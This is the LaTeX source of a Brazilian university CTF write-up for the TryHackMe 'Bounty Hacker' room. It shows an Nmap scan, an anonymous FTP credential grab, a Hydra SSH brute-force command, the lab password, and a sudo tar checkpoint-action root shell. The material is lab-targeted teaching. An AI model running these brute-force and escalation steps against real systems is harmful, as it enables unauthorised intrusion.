%==============================================================================
% Write-Up de CTF - Bounty Hacker (TryHackMe)
% Materia : CIC0087 - Topicos Avancados em Computadores - Turma 04 - 2026/2
% Depto.  : Departamento de Ciencias da Computacao
% Baseado na "Metodologia para Construcao de Write-Ups em CTF"
%
% Compilacao:  pdflatex main.tex   (rodar 2x para atualizar o Sumario)
%==============================================================================
\documentclass[12pt,a4paper]{article}

%------------------------- Codificacao e idioma -------------------------------
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[brazil]{babel}

%------------------------- Fonte Times New Roman ------------------------------
\usepackage{newtxtext}   % corpo em Times
\usepackage{newtxmath}   % matematica em Times

%------------------------- Margens (minimo 2 cm) ------------------------------
\usepackage[a4paper,margin=2cm,headheight=15pt,includehead,includefoot]{geometry}

%------------------------- Utilitarios ----------------------------------------
\usepackage{graphicx}
\graphicspath{{img/}{./img/}}
\usepackage{xcolor}
\usepackage{float}
\usepackage[hidelinks]{hyperref}
\usepackage{fancyhdr}
\usepackage{listings}
\usepackage[most]{tcolorbox}
\usepackage{caption}
\usepackage{enumitem}
\usepackage{setspace}

\hypersetup{
  colorlinks=true,
  linkcolor=black,
  urlcolor=blue!60!black,
  citecolor=black
}
\onehalfspacing

%============================= METADADOS =======================================
\newcommand{\desafioNome}{Bounty Hacker}
\newcommand{\plataforma}{TryHackMe}
\newcommand{\dificuldade}{Fácil}
\newcommand{\dataResolucao}{01/10/2026}
\newcommand{\autorNome}{Luís Eduardo Curi Serra}

% Dados academicos (fixos para a disciplina)
\newcommand{\materia}{CIC0087 -- Tópicos Avançados em Computadores -- Turma 04 -- 2026/2}
\newcommand{\departamento}{Departamento de Ciências da Computação}
\newcommand{\matricula}{251033574}
\newcommand{\professor}{Roberto Rodrigues Filho}
\newcommand{\universidade}{Universidade de Brasília}
%===============================================================================

%------------------------- Cabecalho e rodape ---------------------------------
\pagestyle{fancy}
\fancyhf{}
\lhead{\small\itshape \desafioNome}
\rhead{\small\itshape \autorNome}
\lfoot{\small \materia}
\rfoot{\small Página \thepage}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0.4pt}

%------------------------- Estilo dos blocos de codigo ------------------------
\definecolor{codebg}{gray}{0.95}
\definecolor{codeframe}{gray}{0.75}
\definecolor{cmt}{RGB}{100,120,100}
\definecolor{kw}{RGB}{0,0,150}
\definecolor{str}{RGB}{150,50,50}

\lstdefinestyle{shell}{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{kw}\bfseries,
  commentstyle=\color{cmt}\itshape,
  stringstyle=\color{str},
  frame=single,
  rulecolor=\color{codeframe},
  breaklines=true,
  breakatwhitespace=false,
  postbreak=\mbox{\textcolor{codeframe}{$\hookrightarrow$}\space},
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  tabsize=2,
  captionpos=b,
  xleftmargin=0.4em,
  xrightmargin=0.4em,
  aboveskip=1em,
  belowskip=1em,
}
\lstset{style=shell}

% Atalho: comando de terminal em linha
\newcommand{\cmd}[1]{\lstinline[style=shell]|#1|}

% Ambiente para OUTPUT (fundo levemente diferente, fonte menor)
\lstdefinestyle{output}{
  style=shell,
  backgroundcolor=\color{gray!8},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\ttfamily,
}

%------------ Caixa de "becos sem saida" (tentativas sem sucesso) --------------
\definecolor{deadendbg}{RGB}{255,248,240}
\definecolor{deadendframe}{RGB}{193,108,44}
\newtcolorbox{becosemsaida}[1][Tentativas sem sucesso (becos sem saída)]{%
  enhanced, breakable,
  colback=deadendbg, colframe=deadendframe,
  colbacktitle=deadendframe, coltitle=white,
  boxrule=0.6pt, arc=2pt,
  left=8pt, right=8pt, top=6pt, bottom=6pt,
  fonttitle=\bfseries\small,
  title={#1}%
}

%===============================================================================
\begin{document}

%============================= 2.1 CAPA =========================================
\begin{titlepage}
  \thispagestyle{empty}
  \centering
  {\scshape \universidade \par}
  {\scshape \departamento \par}
  \vspace{0.4cm}
  {\small \materia \par}
  \vspace{2.5cm}

  \rule{\linewidth}{0.4pt}\par
  \vspace{0.6cm}
  {\huge \bfseries Write-Up: \desafioNome \par}
  \vspace{0.4cm}
  {\large Segurança Ofensiva --- Capture The Flag \par}
  \vspace{0.6cm}
  \rule{\linewidth}{0.4pt}\par

  \vspace{2.0cm}
  \begin{tabular}{rl}
    \textbf{Plataforma:}       & \plataforma       \\[4pt]
    \textbf{Dificuldade:}      & \dificuldade      \\[4pt]
    \textbf{Data de resolução:}& \dataResolucao    \\
  \end{tabular}

  \vfill

  \begin{tabular}{rl}
    \textbf{Autor:}     & \autorNome  \\[4pt]
    \textbf{Matrícula:} & \matricula  \\[4pt]
    \textbf{Professor:} & \professor  \\
  \end{tabular}

  \vspace{1.2cm}
  {\small \today \par}
\end{titlepage}

%============================= 2.2 SUMARIO ======================================
\newpage
\tableofcontents
\thispagestyle{fancy}
\newpage

%============================= 2.3 VISAO GERAL ==================================
\section{Visão Geral}
\textbf{Bounty Hacker} é uma máquina Linux de dificuldade \emph{fácil} que expõe
três serviços: FTP, SSH e HTTP. A superfície de ataque explorada combina uma
\textbf{configuração insegura do FTP} (acesso \emph{anonymous} habilitado) com a
\textbf{reutilização de credenciais}. O servidor FTP permite \emph{login}
anônimo e disponibiliza dois arquivos: \texttt{task.txt}, assinado pelo usuário
\texttt{lin} (vazando o \textbf{nome de usuário}), e \texttt{locks.txt}, que é na
prática uma \textbf{lista de senhas}. Com usuário e \emph{wordlist} em mãos,
um ataque de \emph{força bruta} contra o SSH descobre a senha válida de
\texttt{lin}, concedendo acesso ao sistema e à \emph{flag} de usuário. A
enumeração local revela uma política de \texttt{sudo} perigosa: \texttt{lin}
pode executar \texttt{/bin/tar} como \texttt{root}, binário que (conforme o
\emph{GTFOBins}) permite executar comandos arbitrários via
\texttt{-{}-checkpoint-action}, resultando em escalada para \texttt{root}.
O fluxo geral foi: reconhecimento (Nmap) $\rightarrow$ coleta de credenciais
(FTP \emph{anonymous}) $\rightarrow$ força bruta de SSH $\rightarrow$ acesso como
\texttt{lin} $\rightarrow$ escalada via \texttt{sudo}/\texttt{tar} mal
configurado $\rightarrow$ \texttt{root}.

%============================= 2.4 RECONHECIMENTO ===============================
\section{Reconhecimento}

\subsection{Varredura de portas}
A varredura inicial identifica quais serviços estão expostos e suas portas,
orientando as fases seguintes.

\begin{lstlisting}[language=bash,caption={Varredura de portas e serviços com Nmap.}]
nmap -T4 <TARGET_IP>
\end{lstlisting}

A varredura retorna \textbf{três portas abertas}: \textbf{21/tcp (FTP)},
\textbf{22/tcp (SSH)} e \textbf{80/tcp (HTTP)}.

\begin{lstlisting}[style=output,caption={Portas abertas retornadas pela varredura.}]
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for <TARGET_IP>
Host is up (0.14s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
\end{lstlisting}

\begin{figure}[H]
  \centering
  \includegraphics[width=0.95\linewidth]{fig/fig1.png}
  \caption{Varredura Nmap contra o alvo: portas 21 (FTP), 22 (SSH) e 80 (HTTP)
  abertas.}
  \label{fig:nmap}
\end{figure}
  
%============================= 2.5 EXPLORACAO ===================================
\section{Exploração}

\subsection{Coleta de credenciais via FTP anônimo}
O serviço FTP aceita \emph{login} \textbf{anonymous}, uma má configuração que
expõe o conteúdo do servidor sem autenticação. Após autenticar com o usuário
\texttt{anonymous}, listam-se dois arquivos: \texttt{locks.txt} e
\texttt{task.txt}, ambos baixados com o comando \cmd{get}.

\begin{lstlisting}[language=bash,caption={Login anônimo no FTP e download dos arquivos.}]
ftp <TARGET_IP> 21
# Name: anonymous   (sem senha)
ftp> ls
ftp> get locks.txt
ftp> get task.txt
\end{lstlisting}

\begin{lstlisting}[style=output,caption={Sessão FTP: login bem-sucedido e listagem dos arquivos.}]
220 (vsFTPd 3.0.5)
Name (<TARGET_IP>:kali): anonymous
230 Login successful.
Remote system type is UNIX.
ftp> ls
-rw-rw-r--  1 ftp  ftp  418 Jun 07  2020 locks.txt
-rw-rw-r--  1 ftp  ftp   68 Jun 07  2020 task.txt
226 Directory send OK.
\end{lstlisting}

\begin{figure}[H]
  \centering
  \includegraphics[width=0.95\linewidth]{fig/fig2.png}
  \caption{Login \emph{anonymous} no serviço FTP e \emph{download} dos arquivos
  \texttt{locks.txt} e \texttt{task.txt}.}
  \label{fig:ftp}
\end{figure}

\subsection{Análise dos arquivos}
O arquivo \texttt{task.txt} contém uma lista de tarefas \textbf{assinada por
\texttt{lin}}, revelando o \textbf{nome de usuário} do sistema.

\begin{lstlisting}[style=output,caption={Conteúdo de task.txt: assinatura revela o usuário.}]
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
\end{lstlisting}

O arquivo \texttt{locks.txt} contém 26 linhas de senhas candidatas --- ou seja,
uma \textbf{lista de senhas} (\emph{wordlist}) pronta para um ataque de força
bruta contra o usuário \texttt{lin}.

\begin{lstlisting}[style=output,caption={Trecho de locks.txt (lista de senhas candidatas).}]
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
...
RedDr4gonSynd1cat3      <-- senha valida
...
ReDSynd1ca7e
\end{lstlisting}

\subsection{Força bruta no SSH}
Com o usuário (\texttt{lin}) e a \emph{wordlist} (\texttt{locks.txt}), executa-se
um ataque de força bruta contra o SSH com o \emph{Hydra}.

\begin{lstlisting}[language=bash,caption={Força bruta de senha no SSH com Hydra.}]
hydra -l lin -P locks.txt ssh://<TARGET_IP>
\end{lstlisting}

O ataque descobre a senha válida do usuário \texttt{lin}:

\begin{lstlisting}[style=output,caption={Credencial descoberta pelo Hydra.}]
[22][ssh] host: <TARGET_IP>   login: lin   password: RedDr4gonSynd1cat3
\end{lstlisting}

\begin{becosemsaida}
\begin{itemize}[leftmargin=1.4em,itemsep=2pt,topsep=2pt]
  \item Os arquivos do FTP poderiam, à primeira vista, sugerir uma trilha
        relacionada ao serviço HTTP (porta 80). Entretanto, o conteúdo real de
        \texttt{task.txt} (usuário) e \texttt{locks.txt} (senhas) aponta
        diretamente para a força bruta no SSH --- o serviço web não é o vetor.
\end{itemize}
\end{becosemsaida}

\subsection{Acesso ao sistema e flag de usuário}
De posse da credencial \texttt{lin:RedDr4gonSynd1cat3}, autentica-se via SSH e
lê-se a \emph{flag} de usuário no diretório \emph{home}.

\begin{lstlisting}[language=bash,caption={Login via SSH e leitura da flag de usuário.}]
ssh lin@<TARGET_IP>
# senha: RedDr4gonSynd1cat3
ls -la
cat user.txt            # -> <FLAG_USER>
\end{lstlisting}

\begin{figure}[H]
  \centering
  \includegraphics[width=0.95\linewidth]{fig/fig3.png}
  \caption{Autenticação via SSH como \texttt{lin} e leitura da \emph{flag} de
  usuário (\texttt{user.txt}).}
  \label{fig:ssh}
\end{figure}

%======================== 2.6 ESCALADA DE PRIVILEGIOS ==========================
\section{Escalada de Privilégios}

\subsection{Enumeração local}
Como \texttt{lin}, a primeira verificação é a política de \texttt{sudo} do
usuário atual com \cmd{sudo -l} (usando a senha já descoberta). O resultado
mostra que \texttt{lin} pode executar \texttt{/bin/tar} como \texttt{root}.

\begin{lstlisting}[style=output,caption={Politica de sudo: lin pode executar /bin/tar como root.}]
Matching Defaults entries for lin on ip-<TARGET_HOST>:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User lin may run the following commands on ip-<TARGET_HOST>:
    (root) /bin/tar
\end{lstlisting}

\subsection{Obtenção de root e flag final}
O binário \texttt{tar}, quando executável via \texttt{sudo}, permite execução de
comandos arbitrários através da opção \texttt{-{}-checkpoint-action} (técnica
documentada no \emph{GTFOBins}). Dispara-se um \emph{shell} de \texttt{root}
usando um ponto de checagem que executa \texttt{/bin/sh}.

\begin{lstlisting}[language=bash,caption={Escalada a root abusando do sudo + tar (GTFOBins).}]
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami            # -> root
cd /root
cat root.txt      # -> <FLAG_ROOT>
\end{lstlisting}

\begin{figure}[H]
  \centering
  \includegraphics[width=0.95\linewidth]{fig/fig4.png}
  \caption{Escalada de privilégio: \texttt{sudo tar} com
  \texttt{-{}-checkpoint-action} abre um \emph{shell} de \texttt{root}; leitura
  da \emph{flag} final em \texttt{/root/root.txt}.}
  \label{fig:privesc}
\end{figure}

%============================= 2.7 CONCLUSAO ====================================
\section{Conclusão}
O comprometimento resultou do encadeamento de más configurações. Primeiro, o
\textbf{FTP anônimo} expôs dois arquivos que, juntos, entregaram o
\textbf{nome de usuário} (\texttt{lin}, na assinatura de \texttt{task.txt}) e uma
\textbf{lista de senhas} (\texttt{locks.txt}). Em seguida, a ausência de proteção
contra \textbf{força bruta} no SSH permitiu descobrir a senha válida
(\texttt{RedDr4gonSynd1cat3}) e obter acesso ao sistema. Por fim, uma
\textbf{política de \texttt{sudo} insegura} concedia a \texttt{lin} a execução de
\texttt{/bin/tar} como \texttt{root} --- binário que permite \emph{escape} de
\emph{shell}, resultando em escalada trivial para \texttt{root}. As falhas
centrais foram a \textbf{exposição de credenciais via FTP anônimo} e a
\textbf{atribuição de um binário perigoso no \texttt{sudo}}.

%============================= 2.8 REFERENCIAS ==================================
\section{Referências}
Este desafio decorre de más configurações (\emph{FTP anônimo}, \emph{força bruta}
e \emph{sudo} com binário perigoso), não de uma CVE específica.
\begin{itemize}[leftmargin=1.5em]
  \item TryHackMe --- Sala \emph{Bounty Hacker} ---
        \url{https://tryhackme.com/room/cowboyhacker}
  \item GTFOBins --- \texttt{tar} ---
        \url{https://gtfobins.github.io/gtfobins/tar/}
  \item THC-Hydra ---
        \url{https://github.com/vanhauser-thc/thc-hydra}
\end{itemize}

\end{document}
